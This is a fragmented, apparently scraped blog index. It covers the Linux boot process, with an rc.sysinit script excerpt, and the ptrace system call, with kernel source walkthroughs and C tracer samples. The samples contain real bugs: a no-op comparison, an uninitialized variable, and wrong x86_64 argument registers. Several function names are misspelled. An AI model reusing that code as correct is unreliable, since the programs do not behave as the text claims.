由于这一阶段的引导代码的空间只有446字节，所以无法完成理解文件系统结构等功能，因此需要再找一个位于引导记录和设备第一个分区之间的位置来实现更多功能。而这个位置，就是boot loader所在位置。 ","date":"2020-10-19","objectID":"/2020/10/boot/:2:1","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"2. Boot Loader启动引导阶段 boot loader是在OS内核运行之前运行的一段小程序。通过这段小程序，可以初始化硬件设备、建立内存空间的映射图等，从而将系统的软硬件环境设置完备，为OS内核做好一切准备工作。 1. Stage 1 Stage1阶段所执行的代码为在执行系统安装时就预先写入到MBR的Boot Loader中的代码，其主要作用是将磁盘0磁道第2扇区的内容读入内存并执行，它是Stage 1.5阶段或Staget 2阶段的入口。 2. Stage 1.5 由于一些历史技术原因，在第一个分区的开始位置在扇区63和MBR之间遗留了62个512字节的扇区（总计31744字节）。该区域就可以用于存储完善功能的实现代码core.img，大小为25389字节。此时，该空间中可以容纳一些通用的文件系统驱动程序，如标准的ext，fat等。 Stage 1.5阶段是Stage 1阶段和Stage 2阶段的中间桥梁。Stage 1.5阶段具有识别启动分区文件系统的能力，此后GRUB程序便有能力去访问/boot分区下/grub目录下的Stage 2文件，并将Stage 2载入内存执行。 3. Stage 2 Stage 2阶段时，所有的文件都已存放在/boot/grub目录及其子目录下。Stage 2阶段执行时，首先会解析GRUB程序的配置文件grub.conf，并依配置文件决定是否显示系统启动菜单（列出可被加载执行的内核列表）。然后加载内核镜像到内存中，通过initrd程序建立Ramdisk内存虚拟根文件系统。此时控制权将转交给内核程序。 以上各个Stage中GURB和MBR的情况如下图： ","date":"2020-10-19","objectID":"/2020/10/boot/:2:2","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"3. 内核引导流程 内核引导阶段主要通过在内存中建立虚拟根文件系统实现相关设备的驱动并建立和切换到真正的根文件系统。内核文件均以一种自解压的压缩格式存储以节省空间，它与一个初始化的内存映像和存储设备映射表都存储于/boot目录下。 在选定的内核加载到内存中并开始执行后，在其进行任何工作之前，内核文件首先必须从压缩格式解压自身，此时屏幕一般会输出“Uncom pressing Linux”的提示，当解压缩完成后，输出“OK, booting the kernel”。 解压内核镜像加载到内存，以及initrd程序建立Ramdisk内存虚拟根文件系统后，内核开始驱动基本硬件，并调用虚拟根文件系统中的init程序加载驱动模块初始化系统中各种设备的相关配置工作，其中包括CPU、I/O、存储设备等。当所需的驱动程序加载完后，会根据grub.conf配置文件中“root=XXX”部分所指定的内容创建一个根设备，然后将根文件系统以只读的方式挂载，并切换到真正的根文件系统上，同时调用系统进程的老祖宗进程/sbin/init程序，进入系统初始化阶段。 这里涉及到一个关键函数：start_kernel()函数（后续将单独出一篇文章进行该函数的调试），它主要执行了以下操作： 在屏幕上打印出当前的内核版本信息。 执行setup_arch()，对系统结构进行设置。 执行sched_init()，对系统的调度机制进行初始化。先是对每个可用CPU上的runqueque进行初始化;然后初始化0号进程(其task struct和系统空M堆栈在startup_32()中己经被分配)为系统idle进程，即系统空闲时占据CPU的进程。 执行parse_early_param()和parsees_args()解析系统启动参数。 执行trap_in itQ，先设置了系统中断向量表。0－19号的陷阱门用于CPU异常处理;然后初始化系统调用向量;最后调用cpu_init()完善对CPU的初始化，用于支持进程调度机制，包括设定标志位寄存器、任务寄存器、初始化程序调试相关寄存器等等。 执行rcu_init()，初始化系统中的Read-Copy Update互斥机制。 执行init_IRQ()函数，初始化用于外设的中断，完成对IDT的最终初始化过程。 执行init_timers(), softirq_init()和time_init()函数，分别初始系统的定时器机制，软中断机制以及系统日期和时间。 执行mem_init()函数，初始化物理内存页面的page数据结构描述符，完成对物理内存管理机制的创建。 执行kmem_cache_init(),完成对通用slab缓冲区管理机制的初始化工作。 执行fork_init()，计算出当前系统的物理内存容量能够允许创建的进程(线程)数量。 执行proc_caches_init(), bufer_init(), unnamed_dev_init() ,vfs_caches_init(), signals_init()等函数对各种管理机制建立起专用的slab缓冲区队列。 执行proc_root_init()函数，对虚拟文件系统/proc进行初始化。 在start_kenrel()的结尾，内核通过kenrel_thread()创建出第一个系统内核线程(即1号进程)，该线程执行的是内核中的init()函数，负责的是下一阶段的启动任务。最后调用cpues_idle()函数:进入了系统主循环体口默认将一直执行default_idle()函数中的指令，即CPU的halt指令，直到就绪队列中存在其他进程需要被调度时才会转向执行其他函数。此时，系统中唯一存 在就绪状态的进程就是由kerne_hread()创建的init进程(内核线程)，所以内核并不进入default_idle()函数，而是转向init()函数继续启动过程。 完成以上过程后，Linux内核已可以正常运行。 ","date":"2020-10-19","objectID":"/2020/10/boot/:2:3","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"4. 系统初始化流程 该步骤主要完成通过/sbin/init,init程序准备软件运行坏境，启动系统服务 通过/etc/inittab文件确定运行级别，然后去执行系统初始化脚本/etc/rc.sysinit,为用户初始化用户空间环境，在完成初始化后，根据运行级别，系统开始对应级别的目录启动服务，关闭那些不要的服务（里面S99local -\u003e ../rc.local）用户自动服务启动脚本。 关键文件详解 1. 系统启动级别：/etc/inittab文件 # inittab is only used by upstart for the default runlevel. # # ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM. # # System initialization is started by /etc/init/rcS.conf # # Individual runlevels are started by /etc/init/rc.conf # # Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf # # Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf, # with configuration in /etc/sysconfig/init. # # For information on how to write upstart event handlers, or how # upstart works, see init(5), init(8), and initctl(8). # # Default runlevel. The runlevels used are: # 0 - halt (Do NOT set initdefault to this) 关机 # 1 - Single user mode 单用户模式，root用户，无需认证，维护模式； # 2 - Multiuser, without NFS (The same as 3, if you do not have networking)， 多用户模式，会启动网络功能，但是不会启动NFS，维护模式； # 3 - Full multiuser mode 完全功能模式，文本界面； # 4 - unused 预留 # 5 - X11 完全功能模式，图形界面，此处使用的图形界面为X11 # 6 - reboot (Do NOT set initdefault to this) 重启 # id:3:initdefault: 2. 系统初始化脚本：/etc/rc.d/rc.sysinit 该文件在各个不同的发布版本中存在不同，此处仅以centos作为样例进行解释。 /etc/rc.v/rc.sysinit主要的工作大概有以下几项： 获取网络环境和主机类型：读取网络设置文件/etc/sysconfig/network，获取主机名以及网关等网络环境； 测试与挂载内存设备/proc和USB设备/sys：除挂载内存设备外，还会主动检查系统上是否存在USB设备，如果有，则载入对应的驱动，并挂载USB的文件系统； 判断是否启动SELinux：SELinux，全称Security Enhance Linux套件，其主要作用是强化Linux操作环境的安全性； 周边设备的检查与PnP(Plug and Play）参数的测试：根据内核在开机时的检查结果（/proc/sys/kernel/modprobe）开始i 进行ide/scsi/network/audio等周边设备的检查，并利用已装在的kernel模块进行PnP设备的参数测试； 载入用户自定义模块：用户可以在/etc/sysconfig/modules/*.modules设置要加载的模块； 载入内核的相关设置：系统会主动读取/etc/sysctl.conf的内容，根据其配置设置内核各选项； 设置系统时间； 设置console样式； 设置RAID和LVM等功能； 使用fsck进行磁盘文件系统检查； 进行磁盘容量quota的转换（非必要）； 重新以可读模式挂载系统磁盘； 启动quota功能； 启动系统随机装置（产生随机数功能）； 清除开机过程中的缓存内容； 将开机过程中的相关信息写入到/var/log/dmesg文件中。 #!/bin/bash # # /etc/rc.d/rc.sysinit - run once at boot time # # Taken in part from Miquel van Smoorenburg's bcheckrc. # # 获取主机名 HOSTNAME=$(/bin/hostname) set -m # 如果存在/etc/sysconfig/network则执行 if [ -f /etc/sysconfig/network ]; then . /etc/sysconfig/network fi # 执行后HOSTNAME如果为空或“(none)”，则设置主机名为localhost if [ -z \"$HOSTNAME\" -o \"$HOSTNAME\" = \"(none)\" ]; then HOSTNAME=localhost fi # 挂在/proc和/sys，这样fsck才能使用卷标 if [ ! -e /proc/mounts ]; then mount -n -t proc /proc /proc # -n表示不写/etc/mtab，因为此时的/为只读 mount -n -t sysfs /sys /sys \u003e/dev/null 2\u003e\u00261 # 将/sys目录以sysfs格式挂载到/sys目录下 fi # 如果存在/prc/bus/usb目录，则挂载usbfs到usb下 if [ ! -d /proc/bus/usb ]; then modprobe usbcore \u003e/dev/null 2\u003e\u00261 \u0026\u0026 mount -n -t usbfs /proc/bus/usb /proc/bus/usb else mount -n -t usbfs /proc/bus/usb /proc/bus/usb fi # 挂载/etc/fstab文件中定义的所有文件系统 #remount /dev/shm to set attributes from fstab #669700 mount -n -o remount /dev/shm \u003e/dev/null 2\u003e\u00261 #remount /proc to set attributes from fstab #984003 mount -n -o remount /proc \u003e/dev/null 2\u003e\u00261 # 执行functions文件，该文件提供来很多有用的函数，具体内容可见参考文献5 . /etc/init.d/functions PLYMOUTH= [ -x /bin/plymouth ] \u0026\u0026 PLYMOUTH=yes # 在启动时显示一个动画 # 激活udev和selinux # 检查SELinux状态 SELINUX_STATE= if [ -e \"/selinux/enforce\" ] \u0026\u0026 [ \"$(cat /proc/self/attr/current)\" != \"kernel\" ]; then if [ -r \"/selinux/enforce\" ] ; then SELINUX_STATE=$(cat \"/selinux/enforce\") else # 如果无法成功读取，则直接置1 SELINUX_STATE=1 fi fi if [ -n \"$SELINUX_STATE\" -a -x /sbin/restorecon ] \u0026\u0026 __fgrep \" /dev \" /proc/mounts \u003e/dev/null 2\u003e\u00261 ; then /sbin/restorecon -R -F /dev 2\u003e/dev/null fi disable_selinux() { echo $\"*** Warning -- SELinux is active\" echo $\"*** Disabling security enforcement for system recovery.\" echo $\"*** Run 'setenforce 1' to reenable.\" echo \"0\" \u003e \"/selinux/enforce\" } relabel_selinux() { # if /sbin/init is not labeled correctly this process is running in the # wrong context, so a reboot will be required after relabel AUTORELABEL= . /etc/selinux/config echo \"0\" \u003e /selinux/enforce [ -n \"$PLYMOUTH\" ] \u0026\u0026 plymouth --hide-splash if [ \"$AUTORELABEL\" = \"0\" ]; then echo echo $\"*** Warning -- SELinux ${SELINUXTYPE}poli","date":"2020-10-19","objectID":"/2020/10/boot/:2:4","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"5. 启动终端，用户登录shell 这一步是用户登录shell过程 如果没有改变级别，默认情况执行/sbin/mingetty打开6个纯文本终端，让用户输入用户名和密码。输入完成后，再调用login程序，核对密码。如果密码正确，就从文件 /etc/passwd 读取该用户指定的shell，然后启动这个shell。 ","date":"2020-10-19","objectID":"/2020/10/boot/:2:5","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"参考链接 https://linux.cn/article-8807-1.html https://blog.51cto.com/zhang789/1851675 https://www.ruanyifeng.com/blog/2013/08/linux_boot_process.html https://blog.51cto.com/433266/2173126 https://www.cnblogs.com/f-ck-need-u/p/7518142.html ","date":"2020-10-19","objectID":"/2020/10/boot/:3:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Vuln"],"content":"Linux ptrace 详解","date":"2020-10-18","objectID":"/2020/10/ptrace/","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"Linux ptrace 详解 备注：文章中使用的Linux内核源码版本为Linux 5.9，使用的Linux版本为Linux ubuntu 5.4.0-65-generic ","date":"2020-10-18","objectID":"/2020/10/ptrace/:0:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"一、简述 ptrace系统调用提供了一个进程(tracer)可以控制另一个进程(tracee)运行的方法，并且tracer可以监控和修改tracee的内存和寄存器，主要用作实现断点调试和系统调用跟踪。 tracee首先要被attach到tracer上，这里的attach以线程为对象，在多线程场景（这里的多线程场景指的使用clone CLONE_THREAD flag创建的线程组）下，每个线程可以分别被attach到tracer上。ptrace的命令总是以下面的调用格式发送到指定的tracee上： ptrace(PTRACE_foom, pid, ...) // pid为linux中对应的线程ID 一个进程可以通过调用fork()函数来初始化一个跟踪，并让生成的子进程执行PTRACE_TRACEME，然后执行execve(一般情况下)来启动跟踪。进程也可以使用PTRACE_ATTACH或PTRACE_SEIZE进行跟踪。 当处于被跟踪状态时，tracee每收到一个信号就会stop，即使是某些时候信号是被忽略的。tracer将在下一次调用waitpid或与wait相关的系统调用之一）时收到通知。该调用会返回一个状态值，包含tracee停止的原因。tracee发生stop时，tracer可以使用各种ptrace的request来检查和修改tracee。然后，tracer使tracee继续运行，选择性地忽略所传递的信号（甚至传递一个与原来不同的信号）。 当tracer结束跟踪后，发送PTRACE_DETACH信号释放tracee，tracee可以在常规状态下继续运行。 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:1:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"二、函数原型及初步使用 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"1. 函数原型 ptrace的原型如下： long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 其中request参数表明执行的行为（后续将重点介绍）， pid参数标识目标进程，addr参数表明执行peek和poke操作的地址，data参数则对于poke操作，指明存放数据的地址，对于peek操作，指明获取数据的地址。 返回值，成功执行时，PTRACE_PEEK请求返回所请求的数据，其他情况时返回0，失败则返回-1。errno被设置为 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:1","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. 函数定义 ptrace的内核实现在kernel/ptrace.c文件中，内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，从中可以看到整个代码逻辑比较简单，其中对PTRACE_TRACEME和PTRACE_ATTACH 是做特殊处理的。其他的是与架构相关的。 SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); if (!child) { ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 系统调用都改为了SYSCALL_DEFINE的方式。如何获得上面的定义的呢？这里需要穿插一下SYSCALL_DEFINE的定义(syscall.h): #define SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__) #define SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__) #define SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__) #define SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__) #define SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__) #define SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__) 宏定义进行展开： #define SYSCALL_DEFINEx(x, sname, ...) \\ SYSCALL_METADATA(sname, x, __VA_ARGS__) \\ __SYSCALL_DEFINEx(x, sname, __VA_ARGS__) /* * The asmlinkage stub is aliased to a function named __se_sys_*() which * sign-extends 32-bit ints to longs whenever needed. The actual work is * done within __do_sys_*(). */ #ifndef __SYSCALL_DEFINEx #define __SYSCALL_DEFINEx(x, name, ...) \\ __diag_push(); \\ __diag_ignore(GCC, 8, \"-Wattribute-alias\", \\ \"Type aliasing is used to sanitize syscall arguments\");\\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ __attribute__((alias(__stringify(__se_sys##name)))); \\ ALLOW_ERROR_INJECTION(sys##name, ERRNO); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)); \\ asmlinkage long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__)) \\ { \\ long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\\ __MAP(x,__SC_TEST,__VA_ARGS__); \\ __PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__)); \\ return ret; \\ } \\ __diag_pop(); \\ static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) #endif /* __SYSCALL_DEFINEx */ __SYSCALL_DEFINEx中的x表示系统调用的参数个数，且sys_ptrace的宏定义如下： /* kernel/ptrace.c */ asmlinkage long sys_ptrace(long request, long pid, unsigned long addr, unsigned long data); 所以对应的__SYSCALL_DEFINEx应该是SYSCALL_DEFINE4，这与上面的定义SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)一致。 仔细观察上面的代码可以发现，函数定义其实在最后一行，结尾没有分号，然后再加上花括号即形成完整的函数定义。前面的几句代码并不是函数的实现（详细的分析可以跟踪源码，出于篇幅原因此处不放出每个宏定义的跟踪）。 定义的转换过程： SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) --\u003e SYSCALL_DEFINEx(4, _ptrace, __VA_ARGS__) --\u003e __SYSCALL_DEFINEx(4, __ptrace, __VA_ARGS__) #define __SYSCALL_DEFINEx(x, name, ...) \\ asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__)) \\ --\u003e asmlinkage long sys_ptrace(__MAP(4,__SC_DECL,__VA_ARGS__)) 而对__MAP宏和__SC_DECL宏的定义如下： /* * __MAP - apply a macro to syscall arguments * __MAP(n, m, t1, a1, t2, a2, ..., tn, an) will expand to * m(t1, a1), m(t2, a2), ..., m(tn, an) * The first argument must be equal to the amount of type/name * pairs given. Note that this list of pairs (i.e. the arguments * of __MAP starting at the third one) is in the same format as * for SYSCALL_DEFINE\u003cn\u003e/COMPAT_SYSCALL_DEFINE\u003cn\u003e */ #define __MAP0(m,...) #define __MAP1(m,t,a,...) m(t,a) #define __MAP2(m,t,a,","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:2","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. 初步使用 1. 最简单的ls跟踪 首先通过一个简单的例子来熟悉一下ptrace的使用： #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003csys/ptrace.h\u003e#include \u003csys/wait.h\u003e#include \u003csys/reg.h\u003e#include \u003csys/types.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); // Tell kernel, trace me execl(\"/bin/ls\", \"ls\", NULL); }else{ /*Receive certification after child process stopped*/ wait(NULL); /*Read child process's rax*/ orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); printf(\"[+] The child made a system call %ld.\\n\", orig_rax); /*Continue*/ ptrace(PTRACE_CONT, child, NULL, NULL); } return 0; } 运行结果如下： 打印出系统调用号，并等待用户输入。查看/usr/include/x86_64-linux-gnu/asm/unistd_64.h文件（64位系统）查看59对应的系统调用： 59号恰好为execve函数调用。对上面的过程进行简单总结： 父进程通过调用fork()来创建子进程，在子进程中，执行execl()之前，先运行ptrace()，request参数设置为PTRACE_TRACEME来告诉kernel当前进程正在被trace。当有信号量传递到该进程，进程会stop，提醒父进程在wait()调用处继续执行。然后调用execl()，执行成功后，新程序运行前，SIGTRAP信号量被发送到该进程，子进程停止，父进程在wait()调用处收到通知，获取子进程的控制权，查看子进程内存和寄存器相关信息。 当发生系统调用时，kernel保存了rax寄存器的原始内容，其中存放的是系统调用号，我们可以使用request参数为PTRACE_PEEKUSER的ptrace来从子进程的USER段读取出该值。 系统调用检查结束后，子进程通过调用request参数为PTRACE_CONT的ptrace函数继续执行。 2. 系统调用查看参数 #include \u003csys/ptrace.h\u003e#include \u003csys/types.h\u003e#include \u003csys/wait.h\u003e#include \u003cunistd.h\u003e#include \u003csys/user.h\u003e#include \u003csys/reg.h\u003e#include \u003cstdio.h\u003e#include \u003csys/syscall.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, 0, NULL, NULL); execl(\"/bin/ls\", \"ls\", NULL); }else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall = 1; params[0] = ptrace(PTRACE_PEEKUSER, child, 8 * RBX, NULL); params[1] = ptrace(PTRACE_PEEKUSER, child, 8 * RCX, NULL); params[2] = ptrace(PTRACE_PEEKUSER, child, 8 * RDX, NULL); printf(\"Write called with %ld, %ld, %ld\\n\", params[0], params[1], params[2]); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8 * RAX, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } 执行结果： 在上面的程序中，跟踪的是wirte的系统调用，ls命令总计进行了三次write的调用。request参数为PTEACE_SYSCALL时的ptrace使kernel在进行系统调用进入或退出时stop子进程，这等价于执行PTRACE_CONT并在下一次系统调用进入或退出时stop。 wait系统调用中的status变量用于检查子进程是否已退出，这是用来检查子进程是否被ptrace停掉或是否退出的典型方法。而宏WIFEXITED则表示了子进程是否正常结束（例如通过调用exit或者从main返回等），正常结束时返回true。 3. 系统调用参数-改进版 前面有介绍PTRACE_GETREGS参数，使用它来获取寄存器的值相比前面一种方法要简单很多： #include \u003cstdio.h\u003e#include \u003csys/reg.h\u003e#include \u003csys/user.h\u003e#include \u003csys/wait.h\u003e#include \u003csys/ptrace.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003cunistd.h\u003e int main(int argc, char *argv[]){ pid_t child; long orig_rax, rax; long params[3]; int status; int insyscall = 0; struct user_regs_struct regs; child = fork(); if(child == 0){ ptrace(PTRACE_TRACEME, child, 8 * ORIG_RAX, NULL); execl(\"/bin/ls\", \"ls\", NULL); } else{ while(1){ wait(\u0026status); if(WIFEXITED(status)) break; orig_rax = ptrace(PTRACE_PEEKUSER, child, 8*ORIG_RAX, NULL); if(orig_rax == SYS_write){ if(insyscall == 0){ insyscall == 1; ptrace(PTRACE_GETREGS, child, NULL, \u0026regs); printf(\"Write called with %lld, %lld, %lld\\n\", regs.rbx, regs.rcx, regs.rdx); }else{ rax = ptrace(PTRACE_PEEKUSER, child, 8*rax, NULL); printf(\"Write returned with %ld\\n\", rax); insyscall = 0; } } ptrace(PTRACE_SYSCALL, child, NULL, NULL); } } return 0; } 执行结果： 整体输出与前面的代码无所差别，但在代码开发上使用了PTRACE_GETREGS来获取子进程的寄存器的值，简洁了很多。 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:2:3","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"三、sys_ptrace函数源码分析 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:3:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"1. Linux-2.6版本的源码分析 1. 源码分析 首先看一下linux-2.6.0的sys_ptrace的处理流程（以/arch/i386/kernel/ptrace.c为例）： /* * Note that this implementation of ptrace behaves differently from vanilla * ptrace. Contrary to what the man page says, in the PTRACE_PEEKTEXT, * PTRACE_PEEKDATA, and PTRACE_PEEKUSER requests the data variable is not * ignored. Instead, the data variable is expected to point at a location * (in user space) where the result of the ptrace call is written (instead of * being returned). */ asmlinkage int sys_ptrace(long request, long pid, long addr, long data) { struct task_struct *child; struct user * dummy = NULL; int i, ret; lock_kernel(); ret = -EPERM; if (request == PTRACE_TRACEME) { // 请求为PTRACE_TRACEME /* 检查是否做好被跟踪的准备 */ if (current-\u003eptrace \u0026 PT_PTRACED) goto out; ret = security_ptrace(current-\u003eparent, current); if (ret) goto out; /* 检查通过，在process flags中设置ptrace位*/ current-\u003eptrace |= PT_PTRACED; ret = 0; goto out; } /* 非PTRACE_TRACEME的请求*/ ret = -ESRCH; // 首先设置返回值为ESRCH，表明没有该进程，宏定义在errno-base.h头文件中 read_lock(\u0026tasklist_lock); child = find_task_by_pid(pid); // 查找task结构 if (child) get_task_struct(child); read_unlock(\u0026tasklist_lock); if (!child) // 没有找到task结构，指明所给pid错误 goto out; ret = -EPERM; // 返回操作未授权 if (pid == 1) // init进程不允许被调试 goto out_tsk; /* 请求为 PTRACE_ATTACH 时*/ if (request == PTRACE_ATTACH) { ret = ptrace_attach(child); // 进行attach goto out_tsk; } /* 检查进程是否被跟踪，没有的话不能执行其他功能； * 当不是PTRACE_KILL时，要求进程状态为TASK_STOPPED； * 被跟踪进程必须为当前进程的子进程 * 在之前是直接在该代码处实现以上逻辑，现在重新将以上功能封装成了ptrace_check_attach函数 */ ret = ptrace_check_attach(child, request == PTRACE_KILL); if (ret \u003c 0) goto out_tsk; /* 以下就为根据不同的request参数进行对应的处理了，用一个switch来总括，流程比较简单。*/ switch (request) { /* when I and D space are separate, these will need to be fixed. 这算预告吗？23333*/ case PTRACE_PEEKTEXT: /* read word at location addr. */ case PTRACE_PEEKDATA: { unsigned long tmp; int copied; copied = access_process_vm(child, addr, \u0026tmp, sizeof(tmp), 0); ret = -EIO; // 返回I/O错误 if (copied != sizeof(tmp)) break; ret = put_user(tmp,(unsigned long *) data); break; } /* read the word at location addr in the USER area. */ case PTRACE_PEEKUSR: { unsigned long tmp; ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; tmp = 0; /* Default return condition */ if(addr \u003c FRAME_SIZE*sizeof(long)) tmp = getreg(child, addr); if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ addr -= (long) \u0026dummy-\u003eu_debugreg[0]; addr = addr \u003e\u003e 2; tmp = child-\u003ethread.debugreg[addr]; } ret = put_user(tmp,(unsigned long *) data); break; } /* when I and D space are separate, this will have to be fixed. */ case PTRACE_POKETEXT: /* write the word at location addr. */ case PTRACE_POKEDATA: ret = 0; if (access_process_vm(child, addr, \u0026data, sizeof(data), 1) == sizeof(data)) break; ret = -EIO; break; case PTRACE_POKEUSR: /* write the word at location addr in the USER area */ ret = -EIO; if ((addr \u0026 3) || addr \u003c 0 || addr \u003e sizeof(struct user) - 3) break; if (addr \u003c FRAME_SIZE*sizeof(long)) { ret = putreg(child, addr, data); break; } /* We need to be very careful here. We implicitly want to modify a portion of the task_struct, and we have to be selective about what portions we allow someone to modify. */ ret = -EIO; if(addr \u003e= (long) \u0026dummy-\u003eu_debugreg[0] \u0026\u0026 addr \u003c= (long) \u0026dummy-\u003eu_debugreg[7]){ if(addr == (long) \u0026dummy-\u003eu_debugreg[4]) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[5]) break; if(addr \u003c (long) \u0026dummy-\u003eu_debugreg[4] \u0026\u0026 ((unsigned long) data) \u003e= TASK_SIZE-3) break; if(addr == (long) \u0026dummy-\u003eu_debugreg[7]) { data \u0026= ~DR_CONTROL_RESERVED; for(i=0; i\u003c4; i++) if ((0x5f54 \u003e\u003e ((data \u003e\u003e (16 + 4*i)) \u0026 0xf)) \u0026 1) goto out_tsk; } addr -= (long) \u0026dummy-\u003eu_debugreg; addr = addr \u003e\u003e 2; child-\u003ethread.debugreg[addr] = data; ret = 0; } break; case PTRACE_SYSCALL: /* continue and stop at next (return from) syscall */ case PTRACE_CONT: { /* restart after signal. */ long tmp; ret = -EIO; if ((unsigned long) data \u003e _NSIG) break; if (request == PTRACE_SYSCALL) { set_tsk_thread_flag","date":"2020-10-18","objectID":"/2020/10/ptrace/:3:1","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. Linux-5.9版本的源码分析 1. 源码分析 Linux-5.9版本的源码分析： SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data) { struct task_struct *child; long ret; if (request == PTRACE_TRACEME) { // 请求是否为PTRACE_TRACEME ret = ptrace_traceme(); if (!ret) arch_ptrace_attach(current); goto out; } child = find_get_task_by_vpid(pid); // 通过pid请求task结构 if (!child) { // 请求失败，返回ESRCH ret = -ESRCH; goto out; } if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) { ret = ptrace_attach(child, request, addr, data); /* * Some architectures need to do book-keeping after * a ptrace attach. */ if (!ret) arch_ptrace_attach(child); goto out_put_task_struct; } ret = ptrace_check_attach(child, request == PTRACE_KILL || request == PTRACE_INTERRUPT); if (ret \u003c 0) goto out_put_task_struct; /* 根据不同的架构进行不同的处理 */ ret = arch_ptrace(child, request, addr, data); if (ret || request != PTRACE_DETACH) ptrace_unfreeze_traced(child); out_put_task_struct: put_task_struct(child); out: return ret; } 2. 流程梳理 梳理上述源码，可以得到函数流程图如下： 3. 其他 